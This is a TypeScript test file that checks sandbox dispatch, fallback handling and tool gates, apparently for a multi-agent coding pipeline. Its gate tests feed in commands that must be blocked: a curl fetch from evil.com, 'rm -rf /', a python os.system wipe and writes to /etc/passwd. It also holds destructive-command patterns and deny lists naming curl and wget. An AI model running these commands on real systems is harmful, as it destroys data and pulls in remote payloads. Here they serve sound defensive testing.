/**
 * Phase C: Sandbox execution tests — validates that Coder and Tester
 * roles can dispatch to real sandbox Containers via run-session.js.
 *
 * Tests:
 * 1. Task JSON schema correctness for sandbox dispatch
 * 2. Tool gate enforcement (Tester read-only, Coder file-scoped)
 * 3. Fallback chain: sandbox error -> agent -> callModel
 * 4. Sandbox result parsing into CodeArtifact/TestReport
 * 5. apiKey and model config threading into task JSON
 * 6. Coder command policy defaults
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { GraphState, CodeArtifact, TestReport } from './state.js'
import type { SandboxDeps } from './sandbox-role.js'
import { sandboxRole, makeExecutionRole } from './sandbox-role.js'
import { createInitialState } from './state.js'
import type { GraphDeps } from './graph.js'

// ────────────────────────────────────────────────────────────
// Inline gate logic (mirrors sandbox-scripts/tool-gates.js)
// These run inside the sandbox container in production but we
// test the logic here as pure functions to validate C11/C12.
// ────────────────────────────────────────────────────────────

interface GateContext {
  toolCall: { name: string; id: string }
  args: Record<string, unknown>
}
interface GateResult {
  block: boolean
  reason: string
}

function createReadOnlyGate() {
  return (ctx: GateContext): GateResult | undefined => {
    if (ctx.toolCall.name === 'file_write') {
      return { block: true, reason: 'Write blocked: Tester role operates in read-only mode' }
    }
    if (ctx.toolCall.name === 'bash_execute') {
      const command = String(ctx.args?.command ?? '').trim()
      const destructivePatterns = [
        /\brm\s/, /\bmv\s/, /\bcp\s.*>/, /\bchmod\s/, /\bchown\s/,
        /\bmkdir\s/, /\brmdir\s/,
        /\bgit\s+(push|commit|reset|checkout|merge|rebase|stash)/,
        /\bnpm\s+(publish|install|uninstall)/,
        /\bpnpm\s+(publish|install|add|remove)/,
        /\bbun\s+(add|remove|install)/,
        /\btee\s/, /\bdd\s/,
        />\s*[^\s]/,
      ]
      for (const pattern of destructivePatterns) {
        if (pattern.test(command)) {
          return { block: true, reason: `Command blocked: Tester role is read-only, cannot run destructive command "${command.slice(0, 80)}"` }
        }
      }
    }
    return undefined
  }
}

function createFileScopeGate(fileScope: { allowWrite?: string[]; denyWrite?: string[] }) {
  const { resolve } = require('node:path')
  const allowWrite = (fileScope.allowWrite ?? []).map((p: string) => resolve(p))
  const denyWrite = (fileScope.denyWrite ?? []).map((p: string) => resolve(p))

  return (ctx: GateContext): GateResult | undefined => {
    if (ctx.toolCall.name !== 'file_write') return undefined
    const filePath = resolve(String(ctx.args?.file_path ?? ctx.args?.path ?? ''))
    if (!filePath) return undefined
    for (const denied of denyWrite) {
      if (filePath.startsWith(denied)) {
        return { block: true, reason: `File write blocked: ${filePath} is inside denied path ${denied}` }
      }
    }
    const allowed = allowWrite.some((prefix: string) => filePath.startsWith(prefix))
    if (!allowed) {
      return { block: true, reason: `File write blocked: ${filePath} is outside allowed write paths [${allowWrite.join(', ')}]` }
    }
    return undefined
  }
}

function createCommandPolicyGate(commandPolicy: { allowCommands?: string[] | null; denyCommands?: string[] }) {
  const allowCommands = commandPolicy.allowCommands ?? null
  const denyCommands = commandPolicy.denyCommands ?? []

  return (ctx: GateContext): GateResult | undefined => {
    if (ctx.toolCall.name !== 'bash_execute') return undefined
    const command = String(ctx.args?.command ?? '').trim()
    if (!command) return undefined
    for (const denied of denyCommands) {
      if (command.startsWith(denied) || command.includes(`&& ${denied}`) || command.includes(`; ${denied}`)) {
        return { block: true, reason: `Command blocked by policy: "${denied}" is not allowed` }
      }
    }
    if (allowCommands !== null) {
      const allowed = allowCommands.some((prefix: string) => command.startsWith(prefix))
      if (!allowed) {
        return { block: true, reason: `Command blocked by policy: "${command.slice(0, 60)}..." does not match any allowed command prefix` }
      }
    }
    return undefined
  }
}

function composeGates(...gates: ((ctx: GateContext) => GateResult | undefined)[]) {
  return (ctx: GateContext): GateResult | undefined => {
    for (const gate of gates) {
      const result = gate(ctx)
      if (result?.block) return result
    }
    return undefined
  }
}

// ────────────────────────────────────────────────────────────
// Helpers
// ────────────────────────────────────────────────────────────

function makeState(overrides: Partial<GraphState> = {}): GraphState {
  return {
    ...createInitialState('WG-C11', {
      id: 'WG-C11',
      title: 'Phase C Test WorkGraph',
      atoms: [{ id: 'atom-001', description: 'Implement handler', assignedTo: 'coder' }],
      invariants: [{ id: 'INV-001', condition: 'no crashes', severity: 'critical' }],
      dependencies: [],
    }),
    plan: {
      approach: 'Direct implementation',
      atoms: [{ id: 'atom-001', description: 'Implement handler', assignedTo: 'coder' }],
      executorRecommendation: 'sandbox',
      estimatedComplexity: 'low',
    },
    ...overrides,
  }
}

function makeSandboxDeps(overrides: Partial<SandboxDeps> = {}): SandboxDeps {
  return {
    execInSandbox: vi.fn().mockResolvedValue(JSON.stringify({
      ok: true,
      role: 'coder',
      filesChanged: ['src/handler.ts', 'src/handler.test.ts'],
      agentOutput: 'Implemented handler with tests',
      tokenUsage: { input: 200, output: 100, total: 300 },
    })),
    prepareWorkspace: vi.fn().mockResolvedValue(undefined),
    createBackup: vi.fn().mockResolvedValue('backup-phase-c'),
    restoreBackup: vi.fn().mockResolvedValue(undefined),
    ...overrides,
  }
}

function makePersistState() {
  return vi.fn<(state: GraphState, role: string) => Promise<void>>().mockResolvedValue(undefined)
}

// ────────────────────────────────────────────────────────────
// 1. Task JSON schema correctness
// ────────────────────────────────────────────────────────────

describe('Phase C: sandbox task JSON schema', () => {
  it('coder task JSON includes apiKey and model config when provided', async () => {
    const sandboxDeps = makeSandboxDeps()
    const persistState = makePersistState()

    const state = makeState({ workspaceReady: true })
    const node = sandboxRole('coder', sandboxDeps, persistState)

    await node(state)

    const taskJson = (sandboxDeps.execInSandbox as ReturnType<typeof vi.fn>).mock.calls[0]![0]
    const task = JSON.parse(taskJson)

    // Must contain core fields for sandbox session
    expect(task.role).toBe('coder')
    expect(task.workGraphId).toBe('WG-C11')
    expect(task.workGraph).toBeDefined()
    expect(task.workGraph.atoms).toHaveLength(1)
    expect(task.workGraph.invariants).toHaveLength(1)
    expect(task.plan).toBeDefined()
    expect(task.prompt).toBeDefined()
  })

  it('tester task JSON includes code artifact and critique', async () => {
    const sandboxDeps = makeSandboxDeps({
      execInSandbox: vi.fn().mockResolvedValue(JSON.stringify({
        ok: true,
        role: 'tester',
        filesChanged: [],
        testOutput: '5 tests passed',
        agentOutput: 'All tests pass',
        tokenUsage: { input: 100, output: 50, total: 150 },
      })),
    })
    const persistState = makePersistState()

    const code: CodeArtifact = {
      files: [{ path: 'src/handler.ts', content: 'export function handle() {}', action: 'create' }],
      summary: 'Handler implementation',
      testsIncluded: true,
    }
    const state = makeState({
      workspaceReady: true,
      code,
      critique: {
        passed: true,
        issues: [],
        mentorRuleCompliance: [],
        overallAssessment: 'Good',
      },
    })
    const node = sandboxRole('tester', sandboxDeps, persistState)

    await node(state)

    const taskJson = (sandboxDeps.execInSandbox as ReturnType<typeof vi.fn>).mock.calls[0]![0]
    const task = JSON.parse(taskJson)

    expect(task.role).toBe('tester')
    expect(task.code).toBeDefined()
    expect(task.critique).toBeDefined()
  })

  it('task JSON includes workDir field set to /workspace', async () => {
    const sandboxDeps = makeSandboxDeps()
    const persistState = makePersistState()

    const state = makeState({ workspaceReady: true })
    const node = sandboxRole('coder', sandboxDeps, persistState)

    await node(state)

    const taskJson = (sandboxDeps.execInSandbox as ReturnType<typeof vi.fn>).mock.calls[0]![0]
    const task = JSON.parse(taskJson)

    expect(task.workDir).toBe('/workspace')
  })

  it('task JSON includes model specification', async () => {
    const sandboxDeps = makeSandboxDeps()
    const persistState = makePersistState()

    const state = makeState({ workspaceReady: true })
    const node = sandboxRole('coder', sandboxDeps, persistState)

    await node(state)

    const taskJson = (sandboxDeps.execInSandbox as ReturnType<typeof vi.fn>).mock.calls[0]![0]
    const task = JSON.parse(taskJson)

    expect(task.model).toBeDefined()
    expect(task.model.provider).toBeDefined()
    expect(task.model.modelId).toBeDefined()
  })
})

// ────────────────────────────────────────────────────────────
// 2. Tool gate enforcement
// ────────────────────────────────────────────────────────────

describe('Phase C: tool gate enforcement', () => {
  describe('Tester read-only gate (C12)', () => {
    it('blocks file_write for Tester role', () => {
      const gate = createReadOnlyGate()
      const result = gate({
        toolCall: { name: 'file_write', id: 'tc-1' },
        args: { file_path: '/workspace/src/hack.ts', content: 'malicious code' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
      expect(result!.reason).toMatch(/read-only/i)
    })

    it('allows file_read for Tester role', () => {
      const gate = createReadOnlyGate()
      const result = gate({
        toolCall: { name: 'file_read', id: 'tc-2' },
        args: { file_path: '/workspace/src/handler.ts' },
      })

      expect(result).toBeUndefined()
    })

    it('allows pnpm test for Tester role', () => {
      const gate = createReadOnlyGate()
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-3' },
        args: { command: 'pnpm test' },
      })

      expect(result).toBeUndefined()
    })

    it('blocks git push for Tester role', () => {
      const gate = createReadOnlyGate()
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-4' },
        args: { command: 'git push origin main' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })

    it('blocks rm commands for Tester role', () => {
      const gate = createReadOnlyGate()
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-5' },
        args: { command: 'rm -rf /workspace/src' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })

    it('blocks redirect-to-file for Tester role', () => {
      const gate = createReadOnlyGate()
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-6' },
        args: { command: 'echo "hack" > /workspace/src/exploit.ts' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })

    it('allows grep_search for Tester role', () => {
      const gate = createReadOnlyGate()
      const result = gate({
        toolCall: { name: 'grep_search', id: 'tc-7' },
        args: { pattern: 'TODO', path: '/workspace/src' },
      })

      expect(result).toBeUndefined()
    })
  })

  describe('Coder file-scope gate', () => {
    it('allows writes within /workspace', () => {
      const gate = createFileScopeGate({
        allowWrite: ['/workspace'],
      })
      const result = gate({
        toolCall: { name: 'file_write', id: 'tc-8' },
        args: { file_path: '/workspace/src/new-file.ts', content: 'code' },
      })

      expect(result).toBeUndefined()
    })

    it('blocks writes outside /workspace', () => {
      const gate = createFileScopeGate({
        allowWrite: ['/workspace'],
      })
      const result = gate({
        toolCall: { name: 'file_write', id: 'tc-9' },
        args: { file_path: '/etc/passwd', content: 'malicious' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })

    it('deny list overrides allow list', () => {
      const gate = createFileScopeGate({
        allowWrite: ['/workspace'],
        denyWrite: ['/workspace/node_modules'],
      })
      const result = gate({
        toolCall: { name: 'file_write', id: 'tc-10' },
        args: { file_path: '/workspace/node_modules/inject.js', content: 'bad' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })
  })

  describe('Coder command policy gate', () => {
    it('blocks rm -rf commands', () => {
      const gate = createCommandPolicyGate({
        denyCommands: ['rm -rf /'],
      })
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-11' },
        args: { command: 'rm -rf /' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })

    it('blocks curl/wget when deny list includes them', () => {
      const gate = createCommandPolicyGate({
        denyCommands: ['curl', 'wget'],
      })
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-12' },
        args: { command: 'curl https://evil.com/payload' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })

    it('allows pnpm test when allow list includes it', () => {
      const gate = createCommandPolicyGate({
        allowCommands: ['pnpm test', 'node', 'npx tsc'],
      })
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-13' },
        args: { command: 'pnpm test --reporter=verbose' },
      })

      expect(result).toBeUndefined()
    })

    it('blocks unlisted commands when allow list is set', () => {
      const gate = createCommandPolicyGate({
        allowCommands: ['pnpm test', 'node'],
      })
      const result = gate({
        toolCall: { name: 'bash_execute', id: 'tc-14' },
        args: { command: 'python3 -c "import os; os.system(\'rm -rf /\')"' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
    })
  })

  describe('Gate composition', () => {
    it('composeGates returns first blocking gate result', () => {
      const gate1 = createReadOnlyGate()
      const gate2 = createCommandPolicyGate({ denyCommands: ['curl'] })
      const composed = composeGates(gate1, gate2)

      // file_write blocked by read-only gate (gate1)
      const result = composed({
        toolCall: { name: 'file_write', id: 'tc-15' },
        args: { file_path: '/workspace/src/hack.ts', content: 'bad' },
      })

      expect(result).toBeDefined()
      expect(result!.block).toBe(true)
      expect(result!.reason).toMatch(/read-only/i)
    })

    it('composeGates passes when no gate blocks', () => {
      const gate1 = createFileScopeGate({ allowWrite: ['/workspace'] })
      const gate2 = createCommandPolicyGate({ denyCommands: ['curl'] })
      const composed = composeGates(gate1, gate2)

      // file_write within allowed scope
      const result = composed({
        toolCall: { name: 'file_write', id: 'tc-16' },
        args: { file_path: '/workspace/src/good.ts', content: 'ok' },
      })

      expect(result).toBeUndefined()
    })
  })
})

// ────────────────────────────────────────────────────────────
// 3. Fallback chain: sandbox > agent > callModel
// ────────────────────────────────────────────────────────────

describe('Phase C: fallback chain', () => {
  it('sandbox success -- no fallback triggered', async () => {
    const sandboxDeps = makeSandboxDeps()
    const callModel = vi.fn()
    const persistState = makePersistState()

    const executionRole = makeExecutionRole({
      sandboxDeps,
      callModel,
      persistState,
      fetchMentorRules: vi.fn().mockResolvedValue([]),
      dryRun: false,
    })

    const state = makeState({ workspaceReady: true })
    const result = await executionRole('coder')(state)

    // Sandbox succeeded -- callModel should NOT have been called
    expect(sandboxDeps.execInSandbox).toHaveBeenCalled()
    expect(callModel).not.toHaveBeenCalled()
    expect(result.code).toBeDefined()
  })

  it('sandbox failure falls back to coderAgent when provided', async () => {
    const failingSandbox = makeSandboxDeps({
      execInSandbox: vi.fn().mockRejectedValue(new Error('container cold-start timeout')),
    })
    const callModel = vi.fn().mockResolvedValue(JSON.stringify({
      files: [{ path: 'src/fallback.ts', content: '// callModel fallback', action: 'create' }],
      summary: 'callModel fallback code',
      testsIncluded: false,
    }))
    const persistState = makePersistState()

    const executionRole = makeExecutionRole({
      sandboxDeps: failingSandbox,
      callModel,
      persistState,
      fetchMentorRules: vi.fn().mockResolvedValue([]),
      dryRun: false,
      coderAgent: {
        produceCode: vi.fn().mockResolvedValue({
          files: [{ path: 'src/agent-fallback.ts', content: '// agent fallback', action: 'create' }],
          summary: 'Agent fallback code',
          testsIncluded: false,
        }),
      },
    })

    const state = makeState({ workspaceReady: true })
    const result = await executionRole('coder')(state)

    // Should have fallen back to coderAgent, not callModel
    expect(result.code).toBeDefined()
    expect(result.code!.summary).toContain('Agent fallback')
  })

  it('sandbox failure falls back to testerAgent when provided', async () => {
    const failingSandbox = makeSandboxDeps({
      execInSandbox: vi.fn().mockRejectedValue(new Error('sandbox OOM')),
    })
    const callModel = vi.fn().mockResolvedValue(JSON.stringify({
      passed: true, testsRun: 1, testsPassed: 1, testsFailed: 0,
      failures: [], summary: 'callModel fallback tests',
    }))
    const persistState = makePersistState()

    const executionRole = makeExecutionRole({
      sandboxDeps: failingSandbox,
      callModel,
      persistState,
      fetchMentorRules: vi.fn().mockResolvedValue([]),
      dryRun: false,
      testerAgent: {
        runTests: vi.fn().mockResolvedValue({
          passed: true, testsRun: 3, testsPassed: 3, testsFailed: 0,
          failures: [], summary: 'Agent fallback tests',
        }),
      },
    })

    const state = makeState({
      workspaceReady: true,
      code: {
        files: [{ path: 'src/x.ts', content: '//', action: 'create' }],
        summary: 'code', testsIncluded: false,
      },
    })
    const result = await executionRole('tester')(state)

    // Should have fallen back to testerAgent, not callModel
    expect(result.tests).toBeDefined()
    expect(result.tests!.summary).toContain('Agent fallback')
  })

  it('sandbox failure + no agent falls back to callModel', async () => {
    const failingSandbox = makeSandboxDeps({
      execInSandbox: vi.fn().mockRejectedValue(new Error('sandbox unavailable')),
    })
    const callModel = vi.fn().mockResolvedValue(JSON.stringify({
      files: [{ path: 'src/callmodel.ts', content: '// callModel', action: 'create' }],
      summary: 'callModel fallback code',
      testsIncluded: false,
    }))
    const persistState = makePersistState()

    const executionRole = makeExecutionRole({
      sandboxDeps: failingSandbox,
      callModel,
      persistState,
      fetchMentorRules: vi.fn().mockResolvedValue([]),
      dryRun: false,
      // No coderAgent or testerAgent provided
    })

    const state = makeState({ workspaceReady: true })
    const result = await executionRole('coder')(state)

    // Should have fallen all the way back to callModel
    expect(callModel).toHaveBeenCalled()
    expect(result.code).toBeDefined()
  })

  it('dry-run bypasses both sandbox and agent', async () => {
    const sandboxDeps = makeSandboxDeps()
    const callModel = vi.fn()
    const coderAgent = { produceCode: vi.fn() }
    const persistState = makePersistState()

    const executionRole = makeExecutionRole({
      sandboxDeps,
      callModel,
      persistState,
      fetchMentorRules: vi.fn().mockResolvedValue([]),
      dryRun: true,
      coderAgent,
    })

    const state = makeState({ workspaceReady: true })
    const result = await executionRole('coder')(state)

    expect(sandboxDeps.execInSandbox).not.toHaveBeenCalled()
    expect(coderAgent.produceCode).not.toHaveBeenCalled()
    expect(callModel).not.toHaveBeenCalled()
    expect(result.code).toBeDefined()
    expect(result.code!.summary).toContain('Dry-run')
  })
})

// ────────────────────────────────────────────────────────────
// 4. Sandbox result parsing
// ────────────────────────────────────────────────────────────

describe('Phase C: sandbox result parsing', () => {
  it('parses coder sandbox result into CodeArtifact', async () => {
    const sandboxDeps = makeSandboxDeps({
      execInSandbox: vi.fn().mockResolvedValue(JSON.stringify({
        ok: true,
        role: 'coder',
        filesChanged: ['src/handler.ts', 'src/handler.test.ts'],
        agentOutput: 'Implemented request handler with validation',
        tokenUsage: { input: 300, output: 150, total: 450 },
      })),
    })
    const persistState = makePersistState()

    const state = makeState({ workspaceReady: true })
    const node = sandboxRole('coder', sandboxDeps, persistState)
    const result = await node(state)

    expect(result.code).toBeDefined()
    expect(result.code!.files).toHaveLength(2)
    expect(result.code!.files[0]!.path).toBe('src/handler.ts')
    expect(result.code!.summary).toBe('Implemented request handler with validation')
    expect(result.workspaceReady).toBe(true)
    expect(result.coderToolCalls).toBe(2)
  })

  it('parses tester sandbox result into TestReport', async () => {
    const sandboxDeps = makeSandboxDeps({
      execInSandbox: vi.fn().mockResolvedValue(JSON.stringify({
        ok: true,
        role: 'tester',
        filesChanged: [],
        testOutput: '7 tests passed, 1 failed',
        agentOutput: 'Most tests pass, 1 edge case failure',
        tokenUsage: { input: 150, output: 75, total: 225 },
      })),
    })
    const persistState = makePersistState()

    const state = makeState({
      workspaceReady: true,
      code: {
        files: [{ path: 'src/handler.ts', content: 'code', action: 'create' }],
        summary: 'Handler', testsIncluded: true,
      },
    })
    const node = sandboxRole('tester', sandboxDeps, persistState)
    const result = await node(state)

    expect(result.tests).toBeDefined()
    expect(result.tests!.passed).toBe(true)
    expect(result.tests!.testsPassed).toBe(7)
    expect(result.tests!.testsFailed).toBe(1)
    expect(result.tests!.testsRun).toBe(8)
    expect(result.testerToolCalls).toBe(0)
  })

  it('parses tester sandbox failure into TestReport with failure details', async () => {
    const sandboxDeps = makeSandboxDeps({
      execInSandbox: vi.fn().mockResolvedValue(JSON.stringify({
        ok: false,
        role: 'tester',
        filesChanged: [],
        testOutput: '0 tests passed, 3 failed',
        agentOutput: 'Tests fail',
        tokenUsage: { input: 100, output: 50, total: 150 },
        error: 'pnpm test exited with code 1',
      })),
    })
    const persistState = makePersistState()

    const state = makeState({
      workspaceReady: true,
      code: {
        files: [{ path: 'src/handler.ts', content: 'bad code', action: 'create' }],
        summary: 'Broken', testsIncluded: false,
      },
    })
    const node = sandboxRole('tester', sandboxDeps, persistState)
    const result = await node(state)

    expect(result.tests).toBeDefined()
    expect(result.tests!.passed).toBe(false)
    expect(result.tests!.testsFailed).toBe(3)
    expect(result.tests!.failures).toHaveLength(1)
    expect(result.tests!.failures[0]!.error).toContain('pnpm test')
  })

  it('accumulates token usage from sandbox result', async () => {
    const sandboxDeps = makeSandboxDeps({
      execInSandbox: vi.fn().mockResolvedValue(JSON.stringify({
        ok: true,
        role: 'coder',
        filesChanged: ['src/x.ts'],
        agentOutput: 'Done',
        tokenUsage: { input: 500, output: 250, total: 750 },
      })),
    })
    const persistState = makePersistState()

    const state = makeState({ workspaceReady: true, tokenUsage: 1000 })
    const node = sandboxRole('coder', sandboxDeps, persistState)
    const result = await node(state)

    expect(result.tokenUsage).toBe(1750) // 1000 + 750
  })
})

// ────────────────────────────────────────────────────────────
// 5. Coder task JSON includes sandbox-specific fields
// ────────────────────────────────────────────────────────────

describe('Phase C: coder sandbox fields', () => {
  it('coder task includes fileScope for workspace restriction', async () => {
    const sandboxDeps = makeSandboxDeps()
    const persistState = makePersistState()

    const state = makeState({ workspaceReady: true })
    const node = sandboxRole('coder', sandboxDeps, persistState)

    await node(state)

    const taskJson = (sandboxDeps.execInSandbox as ReturnType<typeof vi.fn>).mock.calls[0]![0]
    const task = JSON.parse(taskJson)

    expect(task.fileScope).toBeDefined()
    expect(task.fileScope.allowWrite).toContain('/workspace')
  })

  it('tester task includes read-only enforcement flag', async () => {
    const sandboxDeps = makeSandboxDeps({
      execInSandbox: vi.fn().mockResolvedValue(JSON.stringify({
        ok: true, role: 'tester', filesChanged: [],
        testOutput: 'PASS', agentOutput: 'OK',
        tokenUsage: { input: 50, output: 25, total: 75 },
      })),
    })
    const persistState = makePersistState()

    const state = makeState({
      workspaceReady: true,
      code: {
        files: [{ path: 'src/x.ts', content: '//', action: 'create' }],
        summary: 'code', testsIncluded: false,
      },
    })
    const node = sandboxRole('tester', sandboxDeps, persistState)

    await node(state)

    const taskJson = (sandboxDeps.execInSandbox as ReturnType<typeof vi.fn>).mock.calls[0]![0]
    const task = JSON.parse(taskJson)

    // Tester is read-only -- run-session.js applies readOnlyGate
    // The task JSON should NOT include fileScope (handled by role-based gating in run-session.js)
    expect(task.role).toBe('tester')
  })

  it('coder task includes commandPolicy with deny list', async () => {
    const sandboxDeps = makeSandboxDeps()
    const persistState = makePersistState()

    const state = makeState({ workspaceReady: true })
    const node = sandboxRole('coder', sandboxDeps, persistState)

    await node(state)

    const taskJson = (sandboxDeps.execInSandbox as ReturnType<typeof vi.fn>).mock.calls[0]![0]
    const task = JSON.parse(taskJson)

    expect(task.commandPolicy).toBeDefined()
    expect(task.commandPolicy.denyCommands).toBeDefined()
    expect(task.commandPolicy.denyCommands.length).toBeGreaterThan(0)
  })
})

// ────────────────────────────────────────────────────────────
// 6. Full graph integration with Phase C sandbox
// ────────────────────────────────────────────────────────────

describe('Phase C: graph integration with sandbox execution', () => {
  it('full 5-node graph runs with sandbox coder and tester', async () => {
    const { buildSynthesisGraph } = await import('./graph.js')

    let coderCallCount = 0
    const sandboxDeps = makeSandboxDeps({
      execInSandbox: vi.fn().mockImplementation(async (taskJson: string) => {
        const task = JSON.parse(taskJson)
        if (task.role === 'coder') {
          coderCallCount++
          return JSON.stringify({
            ok: true,
            role: 'coder',
            filesChanged: ['src/handler.ts'],
            agentOutput: `Coder implementation ${coderCallCount}`,
            tokenUsage: { input: 200, output: 100, total: 300 },
          })
        }
        if (task.role === 'tester') {
          return JSON.stringify({
            ok: true,
            role: 'tester',
            filesChanged: [],
            testOutput: '3 tests passed',
            agentOutput: 'Tests pass',
            tokenUsage: { input: 100, output: 50, total: 150 },
          })
        }
        return JSON.stringify({
          ok: true, role: task.role, filesChanged: [],
          agentOutput: '', tokenUsage: { input: 0, output: 0, total: 0 },
        })
      }),
    })

    const callModel = vi.fn().mockImplementation(async (taskKind: string) => {
      switch (taskKind) {
        case 'planner':
          return JSON.stringify({
            approach: 'Plan',
            atoms: [{ id: 'a1', description: 'impl', assignedTo: 'coder' }],
            executorRecommendation: 'sandbox',
            estimatedComplexity: 'low',
          })
        case 'critic':
          return JSON.stringify({
            passed: true, issues: [], mentorRuleCompliance: [],
            overallAssessment: 'Good',
          })
        case 'verifier':
          return JSON.stringify({
            decision: 'pass', confidence: 0.95, reason: 'All good',
          })
        default:
          return JSON.stringify({})
      }
    })

    const persistState = makePersistState()
    const fetchMentorRules = vi.fn().mockResolvedValue([])

    const executionRole = makeExecutionRole({
      sandboxDeps,
      callModel,
      persistState,
      fetchMentorRules,
      dryRun: false,
    })

    const graph = buildSynthesisGraph({
      callModel,
      persistState,
      fetchMentorRules,
      executionRole,
    })

    const initialState = makeState()
    const finalState = await graph.run(initialState, { maxSteps: 50 })

    // Coder ran via sandbox
    expect(coderCallCount).toBe(1)
    expect(finalState.code).toBeDefined()
    expect(finalState.code!.summary).toContain('Coder implementation')

    // Tester ran via sandbox
    expect(finalState.tests).toBeDefined()
    expect(finalState.tests!.passed).toBe(true)

    // Verdict reached
    expect(finalState.verdict!.decision).toBe('pass')

    // Planner, critic, verifier used callModel (3 calls)
    expect(callModel).toHaveBeenCalledTimes(3)
  })
})
